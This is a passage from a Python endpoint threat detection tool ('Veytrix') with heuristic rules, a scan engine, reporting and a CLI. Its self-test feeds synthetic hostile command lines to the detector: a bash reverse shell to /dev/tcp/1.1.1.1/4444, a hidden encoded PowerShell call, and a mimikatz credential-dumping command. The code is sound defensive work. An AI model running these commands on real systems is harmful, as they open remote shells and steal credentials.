                    "Preserve memory image; do not reboot."))
        except (FileNotFoundError, PermissionError, ProcessLookupError):
            continue
    return out


def rule_ld_preload_injection(ctx: SystemContext) -> list[Finding]:
    """R-026: Process with LD_PRELOAD set to suspicious path."""
    if not IS_LINUX:
        return []
    out = []
    for p in ctx.processes:
        if p.pid == ctx.own_pid:
            continue
        try:
            with open(f"/proc/{p.pid}/environ", "rb") as f:
                env = f.read().split(b"\x00")
            for var in env:
                try:
                    decoded = var.decode("utf-8", errors="ignore")
                except Exception:
                    continue
                if decoded.startswith("LD_PRELOAD="):
                    path = decoded.split("=", 1)[1]
                    if any(path.startswith(prefix) for prefix in
                           ("/tmp/", "/var/tmp/", "/dev/shm/", "/home/")):
                        out.append(Finding(
                            "R-026", "Suspicious LD_PRELOAD",
                            "high", 0.85,
                            [f"PID {p.pid} ({p.name})",
                             f"LD_PRELOAD={path}",
                             "User-writable LD_PRELOAD = classic injection"],
                            "T1574.006", p.pid, p.name,
                            "Likely userland hooking. Inspect library."))
        except (FileNotFoundError, PermissionError, ProcessLookupError):
            continue
    return out


ALL_RULES = [
    # V1 pattern-based
    rule_encoded_powershell, rule_hidden_execution, rule_download_cradle,
    rule_office_spawns_shell, rule_browser_spawns_shell,
    rule_suspicious_location, rule_credential_access, rule_lsass_access,
    rule_reverse_shell, rule_base64_pipe, rule_suspicious_port,
    rule_beaconing, rule_masquerading_name,
    # V2 advanced heuristic
    rule_unsigned_binary, rule_wrong_parent_chain, rule_rwx_memory,
    rule_anonymous_exec_memory, rule_orphaned_with_network,
    rule_hidden_process, rule_suspicious_kernel_module,
    rule_self_signed_tls, rule_web_server_spawns_shell,
    rule_cross_platform_spawn, rule_suspicious_child_of_browser_jit,
    rule_memfd_or_deleted_binary, rule_ld_preload_injection,
]


# ═════════════════════════════════════════════════════════════════════════════
# Engine
# ═════════════════════════════════════════════════════════════════════════════

def scan(ctx: Optional[SystemContext] = None) -> list[Finding]:
    if ctx is None:
        ctx = SystemContext.capture()
    findings: list[Finding] = []
    for rule in ALL_RULES:
        try:
            findings.extend(rule(ctx))
        except Exception as exc:
            print(f"{C.DIM}[warn] {rule.__name__}: {exc}{C.RESET}",
                  file=sys.stderr)
    findings.sort(key=lambda f: (-SEV_RANK[f.severity], -f.confidence))
    return findings


# ═════════════════════════════════════════════════════════════════════════════
# Output
# ═════════════════════════════════════════════════════════════════════════════

def print_findings(findings: list[Finding], ctx: SystemContext) -> None:
    print()
    print(f"{C.BOLD}{C.CYAN}{'═' * 72}{C.RESET}")
    print(f"{C.BOLD}{C.CYAN}  VEYTRIX DETECTION  —  {ctx.scan_time[:19]}Z"
          f"{C.RESET}")
    print(f"{C.BOLD}{C.CYAN}{'═' * 72}{C.RESET}")
    print(f"  Platform:    {ctx.platform} "
          f"({'admin' if ctx.is_admin else 'user'})")
    print(f"  Processes:   {len(ctx.processes)}")
    print(f"  Connections: {len(ctx.connections)}")
    print(f"  Findings:    {C.BOLD}{len(findings)}{C.RESET}")
    print()

    if not findings:
        print(f"{C.GREEN}  ✓ No suspicious activity detected.{C.RESET}")
        print(f"{C.DIM}    Clean scan ≠ clean system. Detection is heuristic."
              f"{C.RESET}\n")
        return

    for i, f in enumerate(findings, 1):
        color = SEV_COLOR[f.severity]
        print(f"{C.BOLD}[{i}] {color}{f.severity.upper()}{C.RESET}  "
              f"{C.BOLD}{f.name}{C.RESET}  "
              f"{C.DIM}({f.rule_id} · {f.technique} · "
              f"conf {int(f.confidence*100)}%){C.RESET}")
        if f.affected_pid:
            print(f"    {C.BLUE}Process:{C.RESET} {f.affected_process} "
                  f"(PID {f.affected_pid})")
        for ev in f.evidence:
            print(f"    {C.DIM}•{C.RESET} {ev}")
        if f.remediation:
            print(f"    {C.YELLOW}→{C.RESET} {f.remediation}")
        print()


def print_summary(findings: list[Finding]) -> None:
    counts = {s: 0 for s in SEVERITIES}
    for f in findings:
        counts[f.severity] += 1
    print(f"{C.BOLD}Summary by severity:{C.RESET}")
    for s in reversed(SEVERITIES):
        if counts[s]:
            color = SEV_COLOR[s]
            print(f"  {color}{s.upper():<10}{C.RESET} {counts[s]}")


def print_checks(ctx: SystemContext) -> None:
    print(f"\n{C.BOLD}Detection checks executed:{C.RESET}")
    ran = sum(1 for c in ctx.checks if c.status == "ran")
    skipped = sum(1 for c in ctx.checks if c.status == "skipped")
    denied = sum(1 for c in ctx.checks if c.status == "denied")
    failed = sum(1 for c in ctx.checks if c.status == "failed")
    print(f"  Ran: {ran}  Skipped: {skipped}  "
          f"Denied: {denied}  Failed: {failed}")
    for c in ctx.checks:
        color = {"ran": C.GREEN, "skipped": C.DIM,
                 "denied": C.YELLOW, "failed": C.RED}.get(c.status, C.RESET)
        print(f"  {color}[{c.status:>7}]{C.RESET} {c.name}"
              + (f" — {c.reason}" if c.reason else ""))
    if denied > 0:
        print(f"\n{C.YELLOW}⚠ Some checks were denied — run as "
              f"{'Administrator' if IS_WINDOWS else 'root'} for full coverage."
              f"{C.RESET}")


# ═════════════════════════════════════════════════════════════════════════════
# Self-test
# ═════════════════════════════════════════════════════════════════════════════

def _self_test_context() -> SystemContext:
    ctx = SystemContext()
    ctx.own_pid = -1

    def add(pid, ppid, name, exe, cmd, user="test"):
        p = ProcInfo(pid, ppid, name, exe, cmd, user, time.time())
        ctx.processes.append(p)
        ctx.procs_by_pid[pid] = p

    # V1 rules
    add(9001, 1, "powershell.exe",
        r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        "powershell -nop -w hidden -enc SQBFAFgA")
    add(9002, 1, "WINWORD.EXE",
        r"C:\Program Files\Microsoft Office\root\WINWORD.EXE", "WINWORD.EXE d")
    add(9003, 9002, "cmd.exe", r"C:\Windows\System32\cmd.exe",
        "cmd /c whoami")
    add(9004, 1, "mimikatz.exe", r"C:\Users\Public\mimikatz.exe",
        "mimikatz.exe sekurlsa::logonpasswords")
    add(9005, 1, "bash", "/bin/bash", "bash -i >& /dev/tcp/1.1.1.1/4444 0>&1")

    # V2 rules
    # R-015: svchost with wrong parent
    add(9010, 1, "svchost.exe", r"C:\Windows\System32\svchost.exe",
        "svchost.exe -k netsvcs")
    add(9011, 9010, "svchost.exe", r"C:\Windows\System32\svchost.exe",
        "svchost.exe")  # parent should be services.exe, not svchost
    # R-014: unsigned binary from user dir
    add(9020, 1, "custom.exe", r"C:\Users\bob\custom.exe", "custom.exe")
    # R-022: web server spawns shell
    add(9030, 1, "nginx", "/usr/sbin/nginx", "nginx: worker")
    add(9031, 9030, "bash", "/bin/bash", "bash")
    # R-024: browser spawns shell
    add(9040, 1, "chrome.exe", r"C:\Program Files\Google\Chrome\chrome.exe",
        "chrome.exe")
    add(9041, 9040, "powershell.exe", r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        "powershell.exe")
    # R-011: suspicious port
    ctx.connections.append(ConnInfo(9005, "bash", "1.2.3.4", 54321,
                                    "9.9.9.9", 4444, "ESTABLISHED"))
    ctx.conns_by_pid[9005] = [ctx.connections[-1]]

    return ctx


def cmd_self_test() -> int:
    print(f"{C.BOLD}{C.CYAN}Self-test on synthetic events...{C.RESET}\n")
    ctx = _self_test_context()
    findings = scan(ctx)
    print_findings(findings, ctx)
    print_summary(findings)

    expected = {"R-001", "R-004", "R-007", "R-011", "R-014",
                "R-015", "R-022", "R-024"}
    caught = {f.rule_id for f in findings}
    missing = expected - caught
    print()
    if missing:
        print(f"{C.RED}✗ MISSING rules: {sorted(missing)}{C.RESET}")
        return 1
    print(f"{C.GREEN}✓ Self-test passed — {len(expected)} expected rules fired."
          f"{C.RESET}")
    return 0


# ═════════════════════════════════════════════════════════════════════════════
# Storage + HTML
# ═════════════════════════════════════════════════════════════════════════════

def save_to_sqlite(findings: list[Finding], path: str) -> None:
    conn = sqlite3.connect(path)
    try:
        conn.execute("""
            CREATE TABLE IF NOT EXISTS findings (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                rule_id TEXT, name TEXT, severity TEXT, confidence REAL,
                technique TEXT, affected_pid INTEGER, affected_process TEXT,
                evidence TEXT, remediation TEXT, timestamp TEXT,
                fingerprint TEXT UNIQUE
            )
        """)
        for f in findings:
            conn.execute(
                "INSERT OR IGNORE INTO findings "
                "(rule_id, name, severity, confidence, technique, "
                "affected_pid, affected_process, evidence, remediation, "
                "timestamp, fingerprint) VALUES (?,?,?,?,?,?,?,?,?,?,?)",
                (f.rule_id, f.name, f.severity, f.confidence, f.technique,
                 f.affected_pid, f.affected_process,
                 json.dumps(f.evidence), f.remediation,
                 f.timestamp, f.fingerprint))
        conn.commit()
    finally:
        conn.close()


def generate_html_report(findings: list[Finding], ctx: SystemContext,
                          output: str) -> str:
    sev_color = {"low": "#28a745", "medium": "#ffc107",
                 "high": "#fd7e14", "critical": "#dc3545"}
    rows = []
    for f in findings:
        color = sev_color[f.severity]
        ev_html = "".join(f"<li>{html.escape(e)}</li>" for e in f.evidence)
        rows.append(f"""
        <div class="finding" style="border-left-color:{color}">
          <h3><span class="badge" style="background:{color}">
            {f.severity.upper()}</span> {html.escape(f.name)}</h3>
          <p class="meta">Rule: {f.rule_id} · {f.technique} ·
             conf {int(f.confidence*100)}%</p>
          <ul>{ev_html}</ul>
          {f'<p class="rem"><strong>Remediation:</strong> '
           f'{html.escape(f.remediation)}</p>' if f.remediation else ''}
        </div>""")
    html_out = f"""<!DOCTYPE html><html><head><meta charset="utf-8">
<title>Veytrix Detection Report</title>
<style>
 body{{font-family:-apple-system,sans-serif;background:#0b1f3a;
      color:#e6edf7;max-width:960px;margin:2rem auto;padding:0 1rem}}
 h1{{color:#00a3ff}} .summary{{background:#16283f;padding:1rem;
      border-radius:8px;margin-bottom:2rem}}
 .finding{{background:#16283f;padding:1rem;border-radius:8px;
      margin-bottom:1rem;border-left:4px solid}}
 .badge{{color:#fff;padding:2px 8px;border-radius:4px;font-size:.8em}}
 .meta{{color:#8899aa;font-size:.9em}} li{{font-family:monospace;
      font-size:.9em;color:#b0c4de}}
 .rem{{background:#1a3350;padding:.5rem;border-radius:4px;font-size:.9em}}
 .clean{{color:#28a745;font-size:1.2em}}
</style></head><body>
<h1>Veytrix Detection Report — V2</h1>
<div class="summary">
 <p>Generated: {ctx.scan_time}</p>
 <p>Platform: {ctx.platform} · Processes: {len(ctx.processes)} ·
    Connections: {len(ctx.connections)} · Findings: {len(findings)}</p>
 <p>Checks ran: {sum(1 for c in ctx.checks if c.status=='ran')} ·
    Denied: {sum(1 for c in ctx.checks if c.status=='denied')}</p>
</div>
{''.join(rows) if rows else '<p class="clean">✓ No findings.</p>'}
</body></html>"""
    Path(output).write_text(html_out, encoding="utf-8")
    return output


# ═════════════════════════════════════════════════════════════════════════════
# CLI
# ═════════════════════════════════════════════════════════════════════════════

def cmd_scan(args) -> int:
    if not HAS_PSUTIL:
        print(f"{C.RED}psutil required: pip install psutil{C.RESET}",
              file=sys.stderr)
        return 1
    ctx = SystemContext.capture()
    findings = scan(ctx)

    if args.json:
        print(json.dumps({
            "scan_time": ctx.scan_time, "platform": ctx.platform,
            "is_admin": ctx.is_admin,
            "processes": len(ctx.processes),
            "connections": len(ctx.connections),
            "checks": [{"name": c.name, "status": c.status,
                        "reason": c.reason} for c in ctx.checks],
            "findings": [{"rule_id": f.rule_id, "name": f.name,
                           "severity": f.severity, "confidence": f.confidence,
                           "technique": f.technique, "pid": f.affected_pid,
                           "process": f.affected_process,
                           "evidence": f.evidence,
                           "remediation": f.remediation,
                           "timestamp": f.timestamp} for f in findings],
        }, indent=2))
        return 0

    print_findings(findings, ctx)
    print_summary(findings)
    if args.checks:
        print_checks(ctx)
    if args.db and findings:
        save_to_sqlite(findings, args.db)
        print(f"{C.DIM}Saved to {args.db}{C.RESET}")
    if args.report:
        path = generate_html_report(findings, ctx, args.report)
        print(f"{C.DIM}Report: {path}{C.RESET}")
    return 0 if not any(f.severity in ("high", "critical")
                        for f in findings) else 2


def cmd_watch(args) -> int:
    if not HAS_PSUTIL:
        print(f"{C.RED}psutil required.{C.RESET}", file=sys.stderr)
        return 1
    print(f"{C.BOLD}{C.CYAN}Continuous monitoring "
          f"(interval {args.interval}s, Ctrl+C){C.RESET}\n")
    seen: set[str] = set()
    try:
        while True:
            ctx = SystemContext.capture()
            findings = scan(ctx)
            new = [f for f in findings if f.fingerprint not in seen]
            if new:
                for f in new:
                    seen.add(f.fingerprint)
                print_findings(new, ctx)
                if args.db:
                    save_to_sqlite(new, args.db)
            else:
                print(f"{C.DIM}[{dt.datetime.now().strftime('%H:%M:%S')}] "
                      f"no new findings ({len(ctx.processes)} procs, "
                      f"{len(ctx.connections)} conns){C.RESET}")
            time.sleep(args.interval)
    except KeyboardInterrupt:
        print(f"\n{C.BOLD}Stopped. Total unique findings: {len(seen)}"
              f"{C.RESET}")
        return 0


def cmd_report(args) -> int:
    if not HAS_PSUTIL:
        return 1
    ctx = SystemContext.capture()
    findings = scan(ctx)
    path = generate_html_report(findings, ctx, args.out)
    print(f"Report: {path}")
    return 0


def main(argv=None) -> int:
    p = argparse.ArgumentParser(prog="veytrix_detect")
    p.add_argument("--version", action="version",
                   version=f"%(prog)s {VERSION}")
    sub = p.add_subparsers(dest="cmd", required=True)

    sp = sub.add_parser("scan", help="one-shot scan")
    sp.add_argument("--json", action="store_true")
    sp.add_argument("--db")
    sp.add_argument("--report")
    sp.add_argument("--checks", action="store_true",
                    help="show which checks ran/skipped")

    sp = sub.add_parser("watch")
    sp.add_argument("--interval", type=int, default=10)
    sp.add_argument("--db")

    sp = sub.add_parser("report")
    sp.add_argument("--out", default="veytrix_report.html")

    sub.add_parser("self-test")

    args = p.parse_args(argv)
    if args.cmd == "scan": return cmd_scan(args)
    if args.cmd == "watch": return cmd_watch(args)
    if args.cmd == "report": return cmd_report(args)
    if args.cmd == "self-test": return cmd_self_test()
    return 1


if __name__ == "__main__":
    sys.exit(main())
